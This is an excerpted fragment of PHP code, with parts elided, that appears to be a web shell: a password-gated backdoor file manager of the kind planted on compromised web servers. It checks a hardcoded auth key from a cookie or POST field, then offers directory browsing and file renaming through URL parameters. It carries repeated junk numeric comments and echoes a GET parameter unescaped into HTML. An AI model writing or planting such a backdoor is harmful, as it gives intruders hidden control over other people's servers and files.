...
$auth_key = "100768d00c0e7c84ca7ce9b61d3f09ef";
...
$pass = false;
if (isset($_COOKIE['pw_name_56891'])) {
    if(($_COOKIE['pw_name_56891']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_56891'])) {
        if(($_POST['pw_name_56891']) == $auth_key) {
            setcookie("pw_name_56891", $_POST['pw_name_56891']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_56891' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720972526676810 1720972526786655 1720972526756383 1720972526579119
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720972526676810 1720972526786655 1720972526756383 1720972526579119
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720972526676810 1720972526786655 1720972526756383 1720972526579119
            $name = PATH . "/" . $_GET['r'];
